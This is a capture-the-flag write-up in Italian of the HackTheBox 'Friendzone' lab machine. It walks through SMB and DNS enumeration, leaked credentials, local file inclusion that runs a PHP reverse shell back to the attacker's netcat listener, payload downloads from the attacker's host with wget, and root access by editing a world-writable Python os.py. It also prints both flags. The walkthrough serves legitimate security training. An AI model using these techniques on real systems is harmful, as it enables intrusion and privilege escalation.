---
title: "Friendzone - HackTheBox"
date: "2019-07-16"
draft: true
---

# User
Scan nmap
```bash
vagrant@kali:~$ nmap -p 1-65535 -T4 -A -v 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-16 01:45 CEST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 01:45
Completed NSE at 01:45, 0.00s elapsed
Initiating NSE at 01:45
Completed NSE at 01:45, 0.00s elapsed
Initiating Ping Scan at 01:45
Scanning 10.10.10.123 [4 ports]
Completed Ping Scan at 01:45, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:45
Completed Parallel DNS resolution of 1 host. at 01:45, 0.01s elapsed
Initiating SYN Stealth Scan at 01:45
Scanning 10.10.10.123 [65535 ports]
Discovered open port 21/tcp on 10.10.10.123
Discovered open port 80/tcp on 10.10.10.123
Discovered open port 22/tcp on 10.10.10.123
Discovered open port 443/tcp on 10.10.10.123
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 139/tcp on 10.10.10.123
Discovered open port 445/tcp on 10.10.10.123
SYN Stealth Scan Timing: About 19.22% done; ETC: 01:47 (0:02:10 remaining)
SYN Stealth Scan Timing: About 42.66% done; ETC: 01:47 (0:01:22 remaining)
SYN Stealth Scan Timing: About 67.57% done; ETC: 01:47 (0:00:44 remaining)
Completed SYN Stealth Scan at 01:47, 130.58s elapsed (65535 total ports)
Initiating Service scan at 01:47
Scanning 7 services on 10.10.10.123
Completed Service scan at 01:47, 12.59s elapsed (7 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.123
Retrying OS detection (try #2) against 10.10.10.123
Retrying OS detection (try #3) against 10.10.10.123
Retrying OS detection (try #4) against 10.10.10.123
Retrying OS detection (try #5) against 10.10.10.123
Initiating Traceroute at 01:47
Completed Traceroute at 01:47, 0.01s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 01:47
Completed Parallel DNS resolution of 2 hosts. at 01:47, 0.14s elapsed
NSE: Script scanning 10.10.10.123.
Initiating NSE at 01:47
Completed NSE at 01:48, 52.90s elapsed
Initiating NSE at 01:48
Completed NSE at 01:48, 0.02s elapsed
Nmap scan report for 10.10.10.123
Host is up (0.022s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c144 1868 5e8b 468d fc7d 888b 1123 781c
|_SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1 |   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|   http/1.1
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=4/16%OT=21%CT=1%CU=35086%PV=Y%DS=2%DC=T%G=Y%TM=5CB5184
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=0%GCD=FA00%ISR=9A%TI=I%CI=RD%II=I%SS=S%TS
OS:=U)SEQ(SP=11%GCD=FA00%ISR=9C%TI=I%CI=RD%II=I%TS=U)OPS(O1=M5B4%O2=M5B4%O3
OS:=M5B4%O4=M5B4%O5=M5B4%O6=M5B4)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFF
OS:F%W6=FFFF)ECN(R=Y%DF=N%T=41%W=FFFF%O=M5B4%CC=N%Q=)T1(R=Y%DF=N%T=41%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=100%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF
OS:=N%T=100%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T4(R=Y%DF=N%T=100%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=N%T=100%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=
OS:100%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=100%W=0%S=Z%A=S%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=37%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=S%T=36%CD=S)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=17 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m59s, deviation: 1h43m54s, median: 0s
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-04-16T02:47:40+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-04-16 01:47:39
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.28 ms 10.0.2.2
2   0.38 ms 10.10.10.123

NSE: Script Post-scanning.
Initiating NSE at 01:48
Completed NSE at 01:48, 0.00s elapsed
Initiating NSE at 01:48
Completed NSE at 01:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.61 seconds
           Raw packets sent: 68461 (3.016MB) | Rcvd: 68456 (2.741MB)
```

Vediamo quali sono gli share di smb con l'accoung guest (password vuota):
```bash
vagrant@kali:~$ smbclient -L 10.10.10.123 -U "Guest%"
Enter WORKGROUP\guest's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
```

Nella share general troviamo il file creds.txt con il seguente contenuto:
```bash
vagrant@kali:~$ smbclient -U "Guest%" //10.10.10.123/general
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                9221460 blocks of size 1024. 6431688 blocks available
smb: \> more creds.txt

creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Provando a fare discovery con dirsearch o gobuster non si trova niente di
interessante. Lanciamo nmap con lo script per il discovery dns
```bash
vagrant@kali:~$ nmap --script=broadcast-dns-service-discovery 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-17 21:11 CEST
Pre-scan script results:
| broadcast-dns-service-discovery: 
|   224.0.0.251
|     8080/tcp http
|       txtvers=1
|       uuid=b379b7d9-61be-47cb-bc34-e3e84cdba717
|       Address=192.168.1.200 fe80:0:0:0:b604:18ff:fe8a:611e
|     8080/tcp xbmc-jsonrpc-h
|       txtvers=1
|       uuid=b379b7d9-61be-47cb-bc34-e3e84cdba717
|       Address=192.168.1.200 fe80:0:0:0:b604:18ff:fe8a:611e
|     9090/tcp xbmc-jsonrpc
|       txtvers=1
|       uuid=b379b7d9-61be-47cb-bc34-e3e84cdba717
|       Address=192.168.1.200 fe80:0:0:0:b604:18ff:fe8a:611e
|     9777/udp xbmc-events
|       Address=192.168.1.200 fe80:0:0:0:b604:18ff:fe8a:611e
|     41800/tcp spotify-connect
|       CPath=/spConn
|_      Address=192.168.1.195
Nmap scan report for 10.10.10.123
Host is up (0.061s latency).
Not shown: 993 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 9.72 seconds
```

Nella homepage del sito in http e, tramite il browser, nel certificato ssl
troviamo due domini, friendzoneportal.red e friendzone.red. Vediamo se il server
DNS li conosce:
```
vagrant@kali:~$ dig +nocmd axfr @10.10.10.123 friendzoneportal.red +noall +answer                    [0]
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
```
```
vagrant@kali:~$ dig +nocmd axfr @10.10.10.123 friendzone.red +noall +answer                        [130]
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
```

Dovremmo cercare un modo per raggiungere i sottodomini trovati. Creiamo una
lista eseguendo i due comandi precedenti ed estraendo la prima colonna con awk.
Rimuoviamo i punti finali con sed e rimuoviamo i duplicati con sort -u:
```
vagrant@kali:~$ dig +nocmd axfr @10.10.10.123 friendzoneportal.red +noall +answer; dig +nocmd axfr @10.10.10.123 friendzone.red +noall +answer) | awk {'print $1'} | sed -e 's/\.$//' | sort -u > friendzone-hosts.txt
vagrant@kali:~$ cat friendzone-hosts.txt
admin.friendzoneportal.red
administrator1.friendzone.red
files.friendzoneportal.red
friendzoneportal.red
friendzone.red
hr.friendzone.red
imports.friendzoneportal.red
uploads.friendzone.red
vpn.friendzoneportal.red
```

Aggiungiamo queste linee a /etc/hosts così da poter visitare i sotto-domini:
```
10.10.10.123 admin.friendzoneportal.red
10.10.10.123 administrator1.friendzone.red
10.10.10.123 files.friendzoneportal.red
10.10.10.123 friendzoneportal.red
10.10.10.123 friendzone.red
10.10.10.123 hr.friendzone.red
10.10.10.123 imports.friendzoneportal.red
10.10.10.123 uploads.friendzone.red
10.10.10.123 vpn.friendzoneportal.red
```

Visitando i sotto-domini (in https), notiamo varie pagine tra cui
administrator1.friendzone.red.
![](https://i.imgur.com/M5KhKWC.png)

Cerchiamo altre pagine nel sotto-dominio:
```
vagrant@kali:~$ gobuster -k -u https://administrator1.friendzone.red -w ~/Wordlists/IntruderPayloads/FuzzLists/dirbuster-dirs.txt -x php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://administrator1.friendzone.red/
[+] Threads      : 10
[+] Wordlist     : /home/vagrant/Wordlists/IntruderPayloads/FuzzLists/dirbuster-dirs.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/06/19 17:26:34 Starting gobuster
=====================================================
2019/06/19 17:26:35 [!] parse https://administrator1.friendzone.red/%: invalid URL escape "%"
/. (Status: 200)
/?? (Status: 200)
/??.php (Status: 200)
/dashboard.php (Status: 200)
/images (Status: 301)
/login.php (Status: 200)
/timestamp.php (Status: 200)
=====================================================
2019/06/19 17:39:24 Finished
=====================================================
```
La pagina timestamp.php ci restituisce un timestamp e la pagina dashboard.php ci
richiede di fare il login. Inseriamo allora i dati che abbiamo trovato
precedentemente nel file creds.txt.

![](https://i.imgur.com/QlfyZob.png)

Notiamo questa sorta di web app che fa uso di richieste GET, e uno dei
parametri, pagename, ha come valore timestamp, che è una delle pagine trovate
prima. Probabilmente quindi la pagina indicata nel parametro pagename viene
caricata ed eseguita.

Questo tipo di vulnerabilità si chiama [local file inclusion](https://hackerstribe.com/vocabolario/lfi-local-file-inclusion/).
Scarichiamo una [reverse shell php](https://github.com/pentestmonkey/php-reverse-shell) e modifichiamo la contenente l'indirizzo ip della nostra scheda di rete tun0 (quella di openvn).
Carichiamola sul server usando samba:
```
vagrant@kali:~$ smbclient //10.10.10.123/Development
Unable to initialize messaging context
Enter WORKGROUP\vagrant's password:
Try "help" to get a list of possible commands.
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (20.9 kb/s) (average 20.9 kb/s)
smb: \>
```

Lanciamo netcat sulla nostra macchina:
```
vagrant@kali:~$ nc -lnvp 1234
```

Per eseguira la reverse shell, sfruttando LFI, visitiamo:
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```
e cerchiamo la flag:
```
Connessione da 10.10.10.123:39410
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 22:22:47 up 2 days, 13:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (481): Inappropriate ioctl for device
bash: no job control in this shell
www-data@FriendZone:/$ cat $(find -name user.txt 2> /dev/null)
a9ed20acecd6c5b6b52f474e15ae9a11
```

## User flag
```
a9ed20acecd6c5b6b52f474e15ae9a11
```

# Root

```
Notiamo un file chiamato mysql_data.conf nella home directory dell'utente
www-data:
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

Proviamo ad usare la password per connetterci tramite SSH per avere una shell
più comoda:
```
ssh friend@10.10.10.123                                                                  16m52s  
The authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.
ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.123' (ECDSA) to the list of known hosts.
friend@10.10.10.123's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Wed Jun 19 09:34:54 2019 from 10.10.14.3
friend@FriendZone:~$
```

Scarichiamo [LinEnum](https://github.com/rebootuser/LinEnum) sul server usando un server web sulla nostra macchina:
```
vagrant@kali:LinEnum$ python -m SimpleHTTPServer 9999
```

```
www-data@FriendZone:/tmp$ wget 10.10.14.11:9999/LinEnum.sh
www-data@FriendZone:/tmp$ chmod +x LinEnum.sh
www-data@FriendZone:/tmp$ ./LinEnum.sh
```

Con LinEnum non si trova niente di interessante, proviamo con [pspy](https://github.com/DominicBreuker/pspy), un tool per monitorare i processi in esecuzione:
```
vagrant@kali:~$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64
vagrant@kali:~$ python -m SimpleHTTPServer 9999
```

```
www-data@FriendZone:~$ wget 10.10.14.11:9999/pspy64
www-data@FriendZone:~$ chmod +x pspy64
www-data@FriendZone:~$ ./pspy65
...
2019/06/20 01:00:01 CMD: UID=0    PID=37893  | /usr/bin/python /opt/server_admin/reporter.py 
...
```

Notiamo che ad intervalli regolari viene eseguito uno script python come utente
root, vediamo cosa contiene e se possiamo sfruttare qualcosa a nostro vantaggio:
```
friend@FriendZone:~$ cat /opt/server_admin/reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

L'unica riga che viene effettivamente eseguita è l'import del modulo os.
Eseguendo python sulla macchina virtuale vediamo che la versione di default è
python2.7, cerchiamo allora il modulo os di python2.7:
```
friend@FriendZone:~$ ls -la /usr/lib/python2.7/os.py
-rw-rw-rw- 1 www-data www-data 25997 Jun 19 09:42 /usr/lib/python2.7/os.py
```

Vediamo che è possibile modificare il file con qualunque utente. Aggiungiamo
allora queste due linee alla fine:
```
system('cp /root/root.txt /tmp')
system('chmod 777 /tmp/root.txt')
```
Rilanciamo pspy e aspettiamo che lo script venga eseguito di nuovo. Quando viene
eseguito cerchiamo la flag in /tmp:
```
friend@FriendZone:/tmp$ cat root.txt 
b0e6c60b82cf96e9855ac1656a9e90c7
```

## Root flag
```
b0e6c60b82cf96e9855ac1656a9e90c7
```
